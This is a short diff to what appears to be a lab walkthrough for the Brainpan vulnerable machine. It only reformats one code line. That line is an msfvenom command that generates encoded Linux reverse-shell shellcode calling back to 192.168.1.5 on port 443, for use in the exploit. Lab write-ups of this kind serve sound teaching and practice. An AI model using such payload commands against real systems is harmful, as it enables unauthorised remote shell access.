@@ -244,9 +244,6 @@ after sending exploit :
 let's perform exploit with another shellcode (linux) on the brainpan machine to exploit it 
 use the following command to create a linux shellcode : 
 
-`
-msfvenom --platform linux -p linux/x86/shell_reverse_tcp LHOST=192.168.1.5 LPORT=443 -b "\x00" -f c  -e x86/shikata_ga_nai
-
-`
+`msfvenom --platform linux -p linux/x86/shell_reverse_tcp LHOST=192.168.1.5 LPORT=443 -b "\x00" -f c  -e x86/shikata_ga_nai`
 
 
